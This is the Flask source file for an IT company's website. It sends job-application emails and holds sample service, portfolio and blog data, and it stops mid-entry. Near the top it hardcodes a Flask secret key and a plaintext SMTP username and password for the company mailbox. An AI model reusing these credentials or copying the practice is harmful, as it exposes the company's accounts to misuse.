from flask import Flask, render_template, request, redirect, url_for, session, jsonify, flash, send_from_directory
from flask_mail import Mail, Message
import os
from datetime import datetime
import tempfile
import json
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from werkzeug.utils import secure_filename
import traceback

app = Flask(__name__)
app.secret_key = 'monyamane-tech-solutions-2024-secret-key'
# Configuration for file uploads
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size
ALLOWED_EXTENSIONS = {'pdf', 'doc', 'docx', 'zip'}

# Email configuration
app.config['MAIL_SERVER'] = 'mail21.domains.co.za'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'support@monyatech.org.za'
app.config['MAIL_PASSWORD'] = '90059Jay#'
app.config['MAIL_DEFAULT_SENDER'] = 'support@monyatech.org.za'

# Initialize Flask-Mail
mail = Mail(app)

# Ensure static directories exist
def ensure_static_dirs():
    directories = [
        'static/images/portfolio',
        'static/images/clients',
        'static/images/team',
        'static/images/blog',
        'static/images/certifications'
    ]
    
    for directory in directories:
        os.makedirs(directory, exist_ok=True)

ensure_static_dirs()

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def send_application_email(applicant_data, attachments=None):
    """Send emails to applicant and company"""
    try:
        # Applicant confirmation email
        applicant_msg = Message(
            subject=f"Application Received: {applicant_data['position']}",
            recipients=[applicant_data['email']],
            body=f"""Dear {applicant_data['firstName']} {applicant_data['lastName']},

Thank you for applying for the {applicant_data['position']} position at Monyamane Tech Solutions.

We have successfully received your application and will review it carefully. Our hiring team typically reviews applications within 1-3 business days.

If your qualifications match our requirements, we'll contact you to schedule an interview.

Application Details:
- Position: {applicant_data['position']}
- Application Date: {datetime.now().strftime('%B %d, %Y')}
- Reference ID: APP{datetime.now().strftime('%Y%m%d%H%M%S')}

Best regards,
Monyamane Tech Solutions Hiring Team
"""
        )
        
        # Company notification email
        company_msg = Message(
            subject=f"New Job Application: {applicant_data['position']}",
            recipients=['info@monyatech.org.za'],
            body=f"""New Job Application Received:

Applicant Information:
- Name: {applicant_data['firstName']} {applicant_data['lastName']}
- Email: {applicant_data['email']}
- Phone: {applicant_data['phone']}
- Position: {applicant_data['position']}
- Application Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- How they heard about us: {applicant_data.get('source', 'Not specified')}
- Availability: {applicant_data.get('availability', 'Not specified')}
- LinkedIn: {applicant_data.get('linkedin', 'Not provided')}

Cover Letter:
{applicant_data.get('coverLetter', 'No cover letter provided')}

Files attached:
- Resume: {applicant_data.get('resume_filename', 'No file')}
- Portfolio: {applicant_data.get('portfolio_filename', 'No file')}
"""
        )
        
        # Attach files if they exist
        if attachments and 'resume' in attachments:
            with open(attachments['resume'], 'rb') as f:
                company_msg.attach(
                    filename=f"resume_{applicant_data['firstName']}_{applicant_data['lastName']}.{attachments['resume'].split('.')[-1]}",
                    content_type="application/octet-stream",
                    data=f.read()
                )
        
        if attachments and 'portfolio' in attachments:
            with open(attachments['portfolio'], 'rb') as f:
                company_msg.attach(
                    filename=f"portfolio_{applicant_data['firstName']}_{applicant_data['lastName']}.{attachments['portfolio'].split('.')[-1]}",
                    content_type="application/octet-stream",
                    data=f.read()
                )
        
        # Send emails
        mail.send(applicant_msg)
        mail.send(company_msg)
        
        return True
        
    except Exception as e:
        print(f"Email sending error: {str(e)}")
        print(traceback.format_exc())
        return False

# Sample data (in a real app, this would come from a database)
services = [
    {
        'id': 1,
        'title': 'Software Development',
        'description': 'Custom software solutions tailored to your business needs.',
        'detailed_description': 'We build robust, scalable software applications using modern technologies like Python, JavaScript, and cloud-native architectures. Our solutions include web applications, mobile apps, and enterprise software.',
        'icon': 'fas fa-code'
    },
    {
        'id': 2,
        'title': 'Cloud Solutions',
        'description': 'Scalable cloud infrastructure and migration services.',
        'detailed_description': 'Migrate your infrastructure to AWS, Azure, or Google Cloud with our expert guidance. We provide cloud architecture design, migration strategies, and ongoing optimization.',
        'icon': 'fas fa-cloud'
    },
    {
        'id': 3,
        'title': 'Cybersecurity',
        'description': 'Comprehensive protection for your digital assets.',
        'detailed_description': 'Protect your business from cyber threats with our security assessments, threat monitoring, incident response, and compliance solutions including POPIA and GDPR.',
        'icon': 'fas fa-shield-alt'
    },
    {
        'id': 4,
        'title': 'IoT Solutions',
        'description': 'We provide home automation solutions, industrial automation solutions',
        'detailed_description': 'Connect your physical world with digital intelligence using our IoT solutions. From smart home systems to industrial monitoring and predictive maintenance.',
        'icon': 'fas fa-microchip'
    },
    {
        'id': 5,
        'title': 'AI & Machine Learning',
        'description': 'We also provide AI solutions such as generative AI',
        'detailed_description': 'Leverage artificial intelligence and machine learning to automate processes, gain insights from data, and create intelligent applications with capabilities like natural language processing and computer vision.',
        'icon': 'fas fa-brain'
    },
    {
        'id': 6,
        'title': 'Database Hosting',
        'description': 'We also provide custom database hosting solutions',
        'detailed_description': 'Secure, high-performance database hosting and management services with automated backups, monitoring, and optimization for SQL and NoSQL databases.',
        'icon': 'fas fa-database'
    }
]

portfolio_items = [
    {
        'id': 1,
        'title': 'E-commerce Platform',
        'client': 'Retail Company',
        'description': 'Built a scalable e-commerce solution with 99.9% uptime.',
        'detailed_description': 'Developed a full-featured e-commerce platform handling 10,000+ daily transactions with integrated payment processing and inventory management.',
        'image': 'e-commerce.jpg',
        'results': 'Increased sales by 200%',
        'technologies': ['Python', 'React', 'AWS', 'PostgreSQL'],
        'category': 'Software Development'
    },
    {
        'id': 2,
        'title': 'Mobile Software Solutions',
        'client': 'Rental Team',
        'description': 'Built a solution for room inspection. This helps tenants and landlords perform room inspection before and after lease agreements.',
        'detailed_description': 'Android mobile application with photo documentation, checklist management, and digital signature capabilities for property inspections.',
        'image': 'mobile.jpg',
        'results': 'Ensure a healthy relationship between tenants and landlords',
        'technologies': ['Android', 'Kotlin', 'Firebase', 'Jetpack Compose'],
        'category': 'Software Development'
    },
    {
        'id': 3,
        'title': 'Web App',
        'client': 'The Rental Team',
        'description': 'Built an AI chat bot that could be used for generating quotes',
        'detailed_description': 'AI-powered chatbot integrated with CRM system to automatically generate accurate quotes based on customer requirements and historical data.',
        'image': 'web.jpg',
        'results': 'Ensure accurate response that will help ensure customers receive the correct quotations',
        'technologies': ['Python', 'Flask', 'OpenAI API', 'React'],
        'category': 'AI'
    },
    {
        'id': 4,
        'title': 'Warehouse Job Tracker',
        'client': 'FHS',
        'description': 'We designed a job tracking app that could be used to monitor employee tasks as well as calculate employee efficiency.',
        'detailed_description': 'Real-time warehouse management system with barcode scanning, task assignment, and performance analytics dashboard.',
        'image': 'warehouse_tracker.jpg',
        'results': 'Ensure business productivity and also allow us to identify underutilized consumables',
        'technologies': ['C#', '.NET', 'SQL Server', 'Angular'],
        'category': 'Software Development'
    },
    {
        'id': 5,
        'title': 'Employee Project Tracker',
        'client': 'FHS',
        'description': 'We designed an employee project tracking system that shows the activity of employees.',
        'detailed_description': 'Comprehensive project management tool with time tracking, resource allocation, and progress reporting features.',
        'image': 'employee_tracker.jpg',
        'results': 'Ensure business continuity and productivity that will help with business efficiency.',
        'technologies': ['Python', 'Django', 'PostgreSQL', 'Vue.js'],
        'category': 'Software Development'
    },
    {
        'id': 6,
        'title': 'Visitor Management System',
        'client': 'The Rental Team',
        'description': 'We designed a visitor management system that allows us to monitor the visitors who come to our premises.',
        'detailed_description': 'End-to-end visitor management solution with Android check-in app, web dashboard, and real-time notifications for security personnel.',
        'image': 'visitor_management.jpg',
        'results': 'Ensure that we have a tool for monitoring access which could be used by the security personnel.',
        'technologies': ['Android', 'Python', 'Flask', 'SQLite'],
        'category': 'IoT'
    },
    {
        'id': 7,
        'title': 'Technician Maintenance Tool',
        'client': 'The Rental Team',
        'description': 'We designed a technician maintenance tool that could be used to help technicians perform inspections.',
        'detailed_description': 'Mobile field service application for technicians to perform equipment inspections, generate digital reports, and automatically send maintenance results to customers.',
        'image': 'technician_maintenance_tool.jpg',
        'results': 'Ensure we have maintenance results report that is automatically sent to the customer after a technician performs maintenance.',
        'technologies': ['React Native', 'Node.js', 'MongoDB', 'AWS'],
        'category': 'Software Development'
    },
    {
        'id': 8,
        'title': 'CRM',
        'client': 'The Rental Team',
        'description': 'We designed a CRM that will allow clients who recently requested maintenance to access their maintenance history.',
        'detailed_description': 'Customer relationship management system with maintenance history tracking, service scheduling, and customer communication portal.',
        'image': 'crm_maintenance.jpg',
        'results': 'This guarantees a good customer relationship.',
        'technologies': ['Python', 'Flask', 'PostgreSQL', 'React'],
        'category': 'Software Development'
    }
]

blog_posts = [
    {
        'id': 1,
        'title': 'Top Tech Trends for 2024',
        'excerpt': 'Explore the emerging technologies shaping the IT landscape in 2024.',
        'content': 'Artificial Intelligence and Machine Learning continue to dominate the technology landscape in 2024. With advancements in generative AI, businesses are finding new ways to automate processes and enhance customer experiences. Cloud computing remains essential, with multi-cloud strategies becoming the norm for enterprises seeking flexibility and resilience.',
        'date': 'January 15, 2024',
        'author': 'Thato Monyamane',
        'category': 'Technology Trends',
        'read_time': '5 min read'
    },
    {
        'id': 2,
        'title': 'Cloud Migration Best Practices',
        'excerpt': 'Learn the essential strategies for successful cloud migration.',
        'content': 'Migrating to the cloud requires careful planning and execution. Start with a comprehensive assessment of your current infrastructure and identify which workloads are suitable for cloud migration. Consider factors like security, compliance, and cost optimization. A phased approach often works best, allowing you to learn and adjust as you go.',
        'date': 'February 1, 2024',
        'author': 'Thato Monyamane',
        'category': 'Cloud Computing',
        'read_time': '7 min read'
    },
    {
        'id': 3,
        'title': 'Cybersecurity in the IoT Era',
        'excerpt': 'Protecting connected devices in an increasingly interconnected world.',
        'content': 'With the proliferation of IoT devices, security concerns have never been more critical. Each connected device represents a potential entry point for cyber threats. Implementing strong authentication, regular firmware updates, and network segmentation are essential practices for securing IoT ecosystems in both home and industrial environments.',
        'date': 'February 20, 2024',
        'author': 'Thato Monyamane',
        'category': 'Cybersecurity',
        'read_time': '6 min read'
    },
    {
        'id': 4,
        'title': 'The Rise of Generative AI in Business Applications',
        'excerpt': 'How generative AI is transforming business operations and customer experiences.',
        'content': '''
        <p>Generative AI has moved beyond being just a buzzword to becoming a transformative technology across industries. At Monyamane Tech Solutions, we're helping businesses leverage this powerful technology to drive innovation and efficiency.</p>

        <h4>Key Applications of Generative AI:</h4>
        <ul>
            <li><strong>Customer Service:</strong> AI-powered chatbots that provide 24/7 support and handle complex queries</li>
            <li><strong>Content Creation:</strong> Automated generation of marketing copy, reports, and documentation</li>
            <li><strong>Code Generation:</strong> AI assistants that help developers write cleaner code faster</li>
            <li><strong>Data Analysis:</strong> Generating insights and visualizations from complex datasets</li>
        </ul>

        <h4>Real-World Impact:</h4>
        <p>We recently implemented a generative AI solution for The Rental Team that reduced their quote generation time from 30 minutes to under 2 minutes. The system analyzes customer requirements and automatically generates accurate, personalized quotes while maintaining brand voice and compliance requirements.</p>

        <h4>Getting Started with Generative AI:</h4>
        <p>Start with a clear business problem, ensure you have quality data, and consider partnering with experts who can help you navigate the technical and ethical considerations. The ROI can be significant when implemented correctly.</p>
        ''',
        'date': 'March 10, 2024',
        'author': 'Thato Monyamane',
        'category': 'AI & Machine Learning',
        'read_time': '8 min read'
    },
    {
        'id': 5,
        'title': 'Building Scalable Mobile Applications for African Markets',
        'excerpt': 'Key considerations for developing mobile apps that perform well in African connectivity conditions.',
        'content': '''
        <p>Developing mobile applications for African markets requires unique considerations around connectivity, device capabilities, and user behavior. At Monyamane Tech Solutions, we've built successful mobile solutions that thrive in these conditions.</p>

        <h4>Critical Success Factors:</h4>
        <ul>
            <li><strong>Offline-First Design:</strong> Ensure core functionality works without internet connectivity</li>
            <li><strong>Data Optimization:</strong> Minimize data usage through efficient APIs and caching strategies</li>
            <li><strong>Device Compatibility:</strong> Support for a wide range of Android devices and versions</li>
            <li><strong>Localized Content:</strong> Adapt to local languages, currencies, and cultural contexts</li>
        </ul>

        <h4>Case Study: Room Inspection App</h4>
        <p>Our mobile inspection application for The Rental Team was designed to work seamlessly in areas with intermittent connectivity. The app stores inspection data locally and syncs when connectivity is available, ensuring no data loss even in poor network conditions.</p>

        <h4>Technical Architecture:</h4>
        <p>We recommend using technologies like React Native or Flutter for cross-platform development, combined with robust offline storage solutions and intelligent sync mechanisms. This approach has proven successful across multiple projects in South Africa and neighboring countries.</p>

        <h4>Future Trends:</h4>
        <p>With improving connectivity and smartphone penetration, we're seeing increased demand for data-intensive applications like video streaming and real-time collaboration tools optimized for African networks.</p>
        ''',
        'date': 'March 25, 2024',
        'author': 'Thato Monyamane',
        'category': 'Mobile Development',
        'read_time': '7 min read'
    },
    {
        'id': 6,
        'title': 'Implementing Effective Database Hosting Strategies',
        'excerpt': 'Best practices for database hosting that ensure performance, security, and scalability.',
        'content': '''
        <p>Choosing the right database hosting strategy is crucial for application performance and data security. At Monyamane Tech Solutions, we help clients make informed decisions about their database infrastructure.</p>

        <h4>Hosting Options Compared:</h4>
        <ul>
            <li><strong>Cloud-Managed Databases:</strong> AWS RDS, Azure SQL Database, Google Cloud SQL</li>
            <li><strong>Self-Managed VPS:</strong> Full control but requires more maintenance</li>
            <li><strong>Hybrid Approaches:</strong> Combining on-premise and cloud solutions</li>
            <li><strong>Database-as-a-Service:</strong> Fully managed solutions with automatic scaling</li>
        </ul>

        <h4>Key Considerations:</h4>
        <ul>
            <li><strong>Performance:</strong> Latency requirements and read/write patterns</li>
            <li><strong>Security:</strong> Encryption, access controls, and compliance requirements</li>
            <li><strong>Cost:</strong> Balancing performance needs with budget constraints</li>
            <li><strong>Scalability:</strong> Ability to handle growth in data and users</li>
        </ul>

        <h4>Our Approach:</h4>
        <p>We typically recommend cloud-managed databases for most business applications due to their reliability, automatic backups, and built-in security features. For clients with specific compliance requirements, we implement hybrid solutions that maintain sensitive data on-premise while leveraging cloud benefits for other operations.</p>

        <h4>Security Best Practices:</h4>
        <p>Always implement encryption at rest and in transit, use strong authentication mechanisms, regularly update and patch your database systems, and maintain comprehensive audit logs.</p>
        ''',
        'date': 'April 5, 2024',
        'author': 'Thato Monyamane',
        'category': 'Database Solutions',
        'read_time': '6 min read'
    },
    {
        'id': 7,
        'title': 'The Future of IoT in South African Industries',
        'excerpt': 'How Internet of Things technology is transforming agriculture, manufacturing, and urban development.',
        'content': '''
        <p>Internet of Things (IoT) technology is creating significant opportunities for innovation across South African industries. From smart agriculture to industrial automation, IoT solutions are driving efficiency and creating new business models.</p>

        <h4>Industry Applications:</h4>
        <ul>
            <li><strong>Agriculture:</strong> Soil moisture monitoring, automated irrigation, livestock tracking</li>
            <li><strong>Manufacturing:</strong> Predictive maintenance, quality control, supply chain optimization</li>
            <li><strong>Urban Development:</strong> Smart parking, waste management, energy optimization</li>
            <li><strong>Healthcare:</strong> Remote patient monitoring, equipment tracking, telemedicine</li>
        </ul>

        <h4>Case Study: Smart Warehouse Solution</h4>
        <p>Our IoT implementation for FHS transformed their warehouse operations. By deploying sensors and connected devices, we enabled real-time inventory tracking, environmental monitoring, and predictive maintenance for equipment. The system reduced inventory discrepancies by 85% and cut equipment downtime by 60%.</p>

        <h4>Technical Implementation:</h4>
        <p>Successful IoT projects require careful consideration of connectivity options (LoRaWAN, NB-IoT, WiFi), power management, data processing architecture, and security. We typically use a combination of edge computing and cloud processing to balance responsiveness and scalability.</p>

        <h4>Challenges and Solutions:</h4>
        <p>Connectivity remains a challenge in some areas, but emerging technologies like satellite IoT and mesh networks are providing solutions. Security is also critical - we implement end-to-end encryption and regular security updates for all deployed devices.</p>
        ''',
        'date': 'April 18, 2024',
        'author': 'Thato Monyamane',
        'category': 'IoT Solutions',
        'read_time': '9 min read'
    },
    {
        'id': 8,
        'title': 'Building Resilient Cybersecurity Frameworks for SMEs',
        'excerpt': 'Practical cybersecurity strategies that small and medium enterprises can implement effectively.',
        'content': '''
        <p>Small and medium enterprises often face significant cybersecurity challenges with limited resources. However, implementing effective security measures doesn't have to be complex or expensive.</p>

        <h4>Essential Security Layers:</h4>
        <ul>
            <li><strong>Network Security:</strong> Firewalls, VPNs, and network segmentation</li>
            <li><strong>Endpoint Protection:</strong> Antivirus, device encryption, and access controls</li>
            <li><strong>Data Security:</strong> Encryption, backup strategies, and data classification</li>
            <li><strong>Human Factor:</strong> Security training and phishing awareness</li>
        </ul>

        <h4>Cost-Effective Strategies:</h4>
        <ul>
            <li>Implement multi-factor authentication for all critical systems</li>
            <li>Use cloud-based security solutions that scale with your business</li>
            <li>Conduct regular security awareness training for employees</li>
            <li>Maintain an incident response plan for security breaches</li>
            <li>Regularly update and patch all software and systems</li>
        </ul>

        <h4>Compliance Considerations:</h4>
        <p>For South African businesses, POPIA compliance is essential. We help clients implement data protection measures that not only secure their information but also ensure regulatory compliance. This includes data classification, access controls, and audit trails.</p>

        <h4>Our Approach:</h4>
        <p>We believe in a risk-based approach to cybersecurity. Start by identifying your most critical assets and potential threats, then implement controls that provide the greatest protection for your investment. Regular security assessments help identify vulnerabilities before they can be exploited.</p>


        ''',
        'date': 'May 2, 2024',
        'author': 'Thato Monyamane',
        'category': 'Cybersecurity',
        'read_time': '7 min read'
    },
    {
        'id': 9,
        'title': 'Database Optimization Techniques for High-Traffic Applications',
        'excerpt': 'Advanced strategies to optimize database performance and handle millions of queries efficiently.',
        'content': '''
        <p>Database performance is critical for application scalability and user experience. At Monyamane Tech Solutions, we've optimized databases handling thousands of transactions per second. Here are proven techniques that deliver results.</p>

        <h4>Query Optimization Strategies:</h4>
        <ul>
            <li><strong>Indexing Strategy:</strong> Implement composite indexes for frequently queried columns and use covering indexes to avoid table scans</li>
            <li><strong>Query Tuning:</strong> Analyze slow queries using EXPLAIN plans, avoid SELECT *, and optimize JOIN operations</li>
            <li><strong>Connection Pooling:</strong> Use PgBouncer for PostgreSQL or connection pools in application code to reduce connection overhead</li>
            <li><strong>Partitioning:</strong> Implement table partitioning for large datasets to improve query performance and maintenance</li>
        </ul>

        <h4>Advanced Optimization Techniques:</h4>
        <ul>
            <li><strong>Read Replicas:</strong> Distribute read traffic across multiple database instances</li>
            <li><strong>Database Sharding:</strong> Horizontally partition data across multiple databases based on specific keys</li>
            <li><strong>Caching Layers:</strong> Implement Redis or Memcached for frequently accessed data</li>
            <li><strong>Materialized Views:</strong> Pre-compute complex queries for faster access</li>
        </ul>

        <h4>Real-World Example:</h4>
        <p>For our e-commerce client, we reduced query response times from 2.5 seconds to 120ms by implementing proper indexing and query optimization. The solution included:</p>
        <ul>
            <li>Composite indexes on frequently filtered columns</li>
            <li>Query rewriting to eliminate N+1 query problems</li>
            <li>Redis caching for product catalog data</li>
            <li>Database connection pooling with PgBouncer</li>
        </ul>

        <h4>Monitoring and Maintenance:</h4>
        <p>Regular monitoring using tools like pg_stat_statements for PostgreSQL or Performance Schema for MySQL is essential. Set up alerts for slow queries and monitor index usage to identify optimization opportunities.</p>
        ''',
        'date': 'May 15, 2024',
        'author': 'Thato Monyamane',
        'category': 'Database Solutions',
        'read_time': '10 min read'
    },
    {
        'id': 10,
        'title': 'Modern Android Development with Jetpack Compose',
        'excerpt': 'Building beautiful, responsive Android apps using Google\'s modern UI toolkit.',
        'content': '''
        <p>Jetpack Compose represents a paradigm shift in Android development, moving from imperative XML-based layouts to declarative Kotlin-based UI development. At Monyamane Tech Solutions, we've embraced Compose for all new Android projects.</p>

        <h4>Key Benefits of Jetpack Compose:</h4>
        <ul>
            <li><strong>Declarative UI:</strong> Describe what your UI should look like, not how to build it</li>
            <li><strong>Less Code:</strong> Reduce boilerplate code by up to 50% compared to traditional XML layouts</li>
            <li><strong>Live Preview:</strong> See changes instantly with Android Studio's interactive preview</li>
            <li><strong>Kotlin-First:</strong> Leverage Kotlin's powerful features including coroutines and extension functions</li>
        </ul>

        <h4>Advanced Compose Patterns:</h4>
        <ul>
            <li><strong>State Hoisting:</strong> Lift state up to make composables stateless and more testable</li>
            <li><strong>Side Effects:</strong> Use LaunchedEffect and rememberCoroutineScope for async operations</li>
            <li><strong>Custom Layouts:</strong> Create complex custom layouts using Layout composable</li>
            <li><strong>Theme System:</strong> Implement consistent theming with Material Design 3</li>
        </ul>

        <h4>Case Study: Room Inspection App Migration</h4>
        <p>We migrated The Rental Team's room inspection app from traditional XML to Jetpack Compose, achieving:</p>
        <ul>
            <li>40% reduction in layout code</li>
            <li>Improved performance with lazy column optimizations</li>
            <li>Faster development with live preview and hot reload</li>
            <li>Better testability with isolated composable testing</li>
        </ul>

        <h4>Performance Optimization Tips:</h4>
        <ul>
            <li>Use <code>remember</code> to avoid unnecessary recompositions</li>
            <li>Implement <code>LazyColumn</code> and <code>LazyRow</code> for large lists</li>
            <li>Leverage <code>derivedStateOf</code> for expensive calculations</li>
            <li>Use <code>Modifier.drawWithCache</code> for custom drawing operations</li>
        </ul>
        ''',
        'date': 'May 28, 2024',
        'author': 'Thato Monyamane',
        'category': 'Mobile Development',
        'read_time': '8 min read'
    },
    {
        'id': 11,
        'title': 'Building Microservices with Flask: Best Practices and Patterns',
        'excerpt': 'Architecting scalable microservices using Python and Flask for modern applications.',
        'content': '''
        <p>Microservices architecture enables teams to build scalable, maintainable applications. Flask's lightweight nature makes it ideal for developing microservices. Here's our approach at Monyamane Tech Solutions.</p>

        <h4>Microservice Design Patterns:</h4>
        <ul>
            <li><strong>API Gateway:</strong> Implement a single entry point for all client requests</li>
            <strong>Service Discovery:</strong> Use Consul or Eureka for dynamic service registration</li>
            <li><strong>Circuit Breaker:</strong> Prevent cascade failures with circuit breaker patterns</li>
            <li><strong>Event-Driven Architecture:</strong> Implement asynchronous communication using message brokers</li>
        </ul>

        <h4>Flask Microservice Implementation:</h4>
        <pre><code>
from flask import Flask, jsonify
from flask_restful import Api, Resource
import requests

app = Flask(__name__)
api = Api(app)

class UserService(Resource):
    def get(self, user_id):
        # Service logic here
        return jsonify({'user': user_data})

api.add_resource(UserService, '/users/&lt;int:user_id&gt;')
        </code></pre>

        <h4>Essential Flask Extensions for Microservices:</h4>
        <ul>
            <li><strong>Flask-RESTful:</strong> For building REST APIs quickly</li>
            <li><strong>Flask-SQLAlchemy:</strong> Database integration with ORM</li>
            <li><strong>Flask-JWT-Extended:</strong> JWT-based authentication</li>
            <li><strong>Flask-CORS:</strong> Cross-origin resource sharing</li>
            <li><strong>Celery:</strong> Background task processing</li>
        </ul>

        <h4>Deployment and Scaling:</h4>
        <ul>
            <li>Containerize services using Docker</li>
            <li>Use Kubernetes for orchestration and scaling</li>
            <li>Implement health checks and readiness probes</li>
            <li>Set up centralized logging with ELK stack</li>
            <li>Monitor performance with Prometheus and Grafana</li>
        </ul>

        <h4>Lessons from Production:</h4>
        <p>Our microservices architecture for a financial services client handles 50,000+ requests per minute with 99.95% uptime. Key success factors included proper service boundaries, comprehensive testing, and robust monitoring.</p>
        ''',
        'date': 'June 10, 2024',
        'author': 'Thato Monyamane',
        'category': 'Software Development',
        'read_time': '12 min read'
    },
    {
        'id': 12,
        'title': 'Cloud Networking Optimization: Reducing Latency and Costs',
        'excerpt': 'Advanced networking strategies to optimize performance and reduce cloud expenses.',
        'content': '''
        <p>Cloud networking costs and performance significantly impact application user experience and operational expenses. Here are proven optimization techniques from our work with major cloud providers.</p>

        <h4>Network Performance Optimization:</h4>
        <ul>
            <li><strong>CDN Implementation:</strong> Use CloudFront, Cloud CDN, or Azure CDN for static content delivery</li>
            <li><strong>Global Accelerator:</strong> Implement AWS Global Accelerator or similar for improved global routing</li>
            <li><strong>Private Connectivity:</strong> Use AWS Direct Connect, Azure ExpressRoute, or Cloud Interconnect</li>
            <li><strong>TCP Optimization:</strong> Tune TCP window sizes and implement HTTP/2 or HTTP/3</li>
        </ul>

        <h4>Cost Optimization Strategies:</h4>
        <ul>
            <li><strong>Data Transfer Optimization:</strong> Minimize cross-region and internet-bound traffic</li>
            <li><strong>VPC Design:</strong> Implement proper subnetting and route table optimization</li>
            <li><strong>Load Balancer Selection:</strong> Choose between ALB, NLB, or Gateway Load Balancers based on needs</li>
            <li><strong>NAT Gateway Optimization:</strong> Use NAT instances for predictable workloads</li>
        </ul>

        <h4>Security and Compliance:</h4>
        <ul>
            <li>Implement network segmentation with security groups and NACLs</li>
            <li>Use Web Application Firewalls (WAF) for application protection</li>
            <li>Implement DDoS protection services</li>
            <li>Enable VPC flow logs for security monitoring</li>
        </ul>

        <h4>Real-World Savings:</h4>
        <p>For a multinational client, we reduced their monthly AWS networking costs by 68% through:</p>
        <ul>
            <li>Implementing S3 Transfer Acceleration for large file uploads</li>
            <li>Optimizing VPC peering connections</li>
            <li>Using CloudFront for global content delivery</li>
            <li>Implementing proper caching strategies</li>
        </ul>

        <h4>Monitoring and Analytics:</h4>
        <p>Use CloudWatch, VPC Flow Logs, and third-party tools to monitor network performance, identify bottlenecks, and optimize resource utilization continuously.</p>
        ''',
        'date': 'June 25, 2025',
        'author': 'Thato Monyamane',
        'category': 'Cloud Computing',
        'read_time': '9 min read'
    },
    {
        'id': 13,
        'title': 'Security Best Practices with Microsoft Cloud Adoption Framework',
        'excerpt': 'Implementing robust security using Microsoft\'s proven cloud adoption methodology.',
        'content': '''
        <p>The Microsoft Cloud Adoption Framework (CAF) provides comprehensive guidance for cloud security implementation. Here's how we apply CAF security best practices at Monyamane Tech Solutions.</p>

        <h4>CAF Security Methodology:</h4>
        <ul>
            <li><strong>Secure Foundation:</strong> Establish identity and access management baseline</li>
            <li><strong>Security Governance:</strong> Implement Azure Policy and Blueprints</li>
            <li><strong>Security Operations:</strong> Set up Azure Security Center and Sentinel</li>
            <li><strong>Compliance Management:</strong> Align with regulatory requirements including POPIA</li>
        </ul>

        <h4>Essential Security Controls:</h4>
        <ul>
            <li><strong>Identity and Access Management:</strong>
                <ul>
                    <li>Implement Azure AD Conditional Access policies</li>
                    <li>Enable Multi-Factor Authentication (MFA) for all users</li>
                    <li>Use Privileged Identity Management (PIM) for just-in-time access</li>
                </ul>
            </li>
            <li><strong>Network Security:</strong>
                <ul>
                    <li>Implement Azure Firewall or Network Security Groups</li>
                    <li>Use Azure DDoS Protection</li>
                    <li>Configure Azure Private Link for PaaS services</li>
                </ul>
            </li>
            <li><strong>Data Protection:</strong>
                <ul>
                    <li>Enable Azure Disk Encryption for VMs</li>
                    <li>Use Azure Key Vault for secrets management</li>
                    <li>Implement Azure Information Protection for data classification</li>
                </ul>
            </li>
        </ul>

        <h4>Security Monitoring and Response:</h4>
        <ul>
            <li>Set up Azure Security Center for continuous assessment</li>
            <li>Use Azure Sentinel for SIEM and SOAR capabilities</li>
            <li>Implement Azure Monitor for comprehensive observability</li>
            <li>Create incident response playbooks in Azure Sentinel</li>
        </ul>

        <h4>Compliance and Governance:</h4>
        <p>We help clients achieve and maintain compliance with frameworks including:</p>
        <ul>
            <li>POPIA (South Africa)</li>
            <li>GDPR (European Union)</li>
            <li>NIST Cybersecurity Framework</li>
            <li>ISO 27001</li>
        </ul>

        <h4>Case Study: Financial Services Client</h4>
        <p>Implemented CAF security framework for a financial institution, achieving 99.9% security compliance and reducing security incidents by 85% within six months.</p>
        ''',
        'date': 'July 8, 2025',
        'author': 'Thato Monyamane',
        'category': 'Cybersecurity',
        'read_time': '11 min read'
    },
    {
        'id': 14,
        'title': 'Docker Optimization: Best Practices for Production Workloads',
        'excerpt': 'Advanced Docker container optimization techniques for improved performance and security.',
        'content': '''
        <p>Docker containers have revolutionized application deployment, but improper configuration can lead to performance issues and security vulnerabilities. Here are our proven optimization strategies.</p>

        <h4>Image Size Optimization:</h4>
        <ul>
            <li><strong>Use Alpine Linux:</strong> Reduce base image size from ~200MB to ~5MB</li>
            <li><strong>Multi-stage Builds:</strong> Separate build and runtime environments</li>
            <li><strong>.dockerignore:</strong> Exclude unnecessary files from build context</li>
            <li><strong>Layer Caching:</strong> Order Dockerfile instructions properly for better caching</li>
        </ul>

        <h4>Performance Optimization:</h4>
        <ul>
            <li><strong>Resource Limits:</strong> Set CPU and memory limits to prevent resource exhaustion</li>
            <li><strong>Storage Drivers:</strong> Use overlay2 for better performance</li>
            <li><strong>Networking:</strong> Choose appropriate network drivers (bridge, host, macvlan)</li>
            <li><strong>Health Checks:</strong> Implement proper health check endpoints</li>
        </ul>

        <h4>Security Hardening:</h4>
        <ul>
            <li><strong>Non-root Users:</strong> Run containers as non-root users</li>
            <li><strong>Read-only Filesystems:</strong> Mount filesystems as read-only where possible</li>
            <li><strong>Security Scanning:</strong> Use Docker Scout or Trivy for vulnerability scanning</li>
            <li><strong>Secrets Management:</strong> Use Docker secrets or external secret managers</li>
        </ul>

        <h4>Advanced Dockerfile Example:</h4>
        <pre><code>
# Multi-stage build for Python application
FROM python:3.11-slim as builder

WORKDIR /app
COPY requirements.txt .
RUN pip install --user -r requirements.txt

FROM python:3.11-alpine
WORKDIR /app
COPY --from=builder /root/.local /root/.local
COPY . .

# Security optimizations
RUN adduser -D appuser && chown -R appuser:appuser /app
USER appuser

# Health check
HEALTHCHECK --interval=30s --timeout=30s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:5000/health || exit 1

CMD ["python", "app.py"]
        </code></pre>

        <h4>Production Deployment Tips:</h4>
        <ul>
            <li>Use orchestration platforms like Kubernetes or Docker Swarm</li>
            <li>Implement centralized logging with ELK stack</li>
            <li>Set up monitoring with Prometheus and Grafana</li>
            <li>Use container registries with vulnerability scanning</li>
            <li>Implement rolling updates for zero-downtime deployments</li>
        </ul>
        ''',
        'date': 'July 22, 2025',
        'author': 'Thato Monyamane',
        'category': 'Cloud Computing',
        'read_time': '10 min read'
    },
    {
        'id': 15,
        'title': 'Cloud AI Services Comparison: Azure vs AWS vs Google Cloud',
        'excerpt': 'Comprehensive analysis of AI and machine learning services across major cloud providers.',
        'content': '''
